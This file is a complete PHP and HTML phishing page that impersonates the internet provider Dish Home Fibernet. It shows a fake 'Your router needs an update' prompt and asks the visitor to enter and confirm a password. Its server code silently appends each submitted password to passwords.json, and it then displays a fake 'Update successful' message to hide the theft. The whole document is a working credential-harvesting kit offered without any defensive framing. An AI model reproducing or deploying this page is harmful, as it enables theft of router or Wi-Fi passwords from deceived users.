<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);

    if (isset($data['password'])) {
        $password = $data['password'];
        $filePath = 'passwords.json';

        if (file_exists($filePath)) {
            $jsonData = file_get_contents($filePath);
            $passwords = json_decode($jsonData, true);
        } else {
            $passwords = [];
        }

        $passwords[] = $password;

        if (file_put_contents($filePath, json_encode($passwords, JSON_PRETTY_PRINT)) === false) {
            header('Content-Type: application/json');
            echo json_encode(['status' => 'error', 'message' => 'Failed to write to file']);
        } else {
            header('Content-Type: application/json');
            echo json_encode(['status' => 'success']);
        }
    } else {
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'No password provided']);
    }
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Dish Home Fibernet</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #FF0000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background-color: #fff;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
            width: 300px;
            text-align: center;
            display: none; /* Hide initially */
        }

        .logo img {
            width: 40%;
            height: auto;
            margin-bottom: 10px;
        }

        .logo p {
            margin: 0;
        }

        .logo span {
            color: red;
        }

        .buttons button {
            background-color: #fff;
            color: #f00;
            border: 1px solid #f00;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin: 5px;
        }

        form input {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        form button {
            background-color: #f00;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }

        #password-mismatch {
            color: red;
            display: none;
        }

        #updating-popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            padding: 20px;
            border: 1px solid #ccc;
            z-index: 9999;
        }

        #update-message {
            display: block;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            padding: 20px;
            border: 1px solid #ccc;
            z-index: 10000;
            text-align: center;
        }

        #update-message button {
            background-color: #f00;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        @media (max-width: 500px){
        .container {
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
            width: 70%;
            text-align: center;
            background-color: yellow;
        }
        }
    </style>
</head>
<body>
    <div id="update-message">
        <p>Your router needs an update.</p>
        <button onclick="closeUpdateMessage()">OK</button>
    </div>

    <div class="container">
        <div class="logo">
            <img src="dh_logo.png" alt="DishHome Logo">
            <p>FIBER<span style="color: red;">NET</span></p>
        </div>
        <div class="buttons">
            <button class="sign-in">SIGN IN</button>
            <button class="sign-up">SIGNUP</button>
        </div>
        <form onsubmit="return storePassword()">
            <input type="password" id="password" placeholder="Password" required>
            <input type="password" id="confirm-password" placeholder="Confirm Password" required>
            <span id="password-mismatch">Passwords do not match</span>
            <button type="submit">Log In</button>
        </form>
    </div>
    <div id="updating-popup">
        Updating...
    </div>
    <script>
        function validatePassword() {
            const password = document.getElementById("password").value;
            const confirmPassword = document.getElementById("confirm-password").value;
            const mismatchMessage = document.getElementById("password-mismatch");

            if (password !== confirmPassword) {
                mismatchMessage.style.display = "block";
                return false;
            } else {
                mismatchMessage.style.display = "none";
                return true;
            }
        }

        function storePassword() {
            if (validatePassword()) {
                const password = document.getElementById("password").value;
                const userCredentials = { password: password };

                fetch(window.location.href, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(userCredentials)
                })
                .then(response => response.json())
                .then(data => {
                    const updatingPopup = document.getElementById("updating-popup");
                    updatingPopup.style.display = "block";

                    setTimeout(function() {
                        updatingPopup.innerHTML = "<p>Update successful!</p><button onclick='closeUpdatingPopup()'>OK</button>";
                    }, 5000); // Simulate updating process for 2 seconds
                })
                .catch(error => {
                    console.error('Error:', error);
                });
            }
            return false;
        }

        function closeUpdateMessage() {
            document.getElementById("update-message").style.display = "none";
            document.querySelector(".container").style.display = "block";
        }

        function closeUpdatingPopup() {
            document.getElementById("updating-popup").style.display = "none";
            document.getElementById("password").value = "";
            document.getElementById("confirm-password").value = "";
        }
    </script>
</body>
</html>
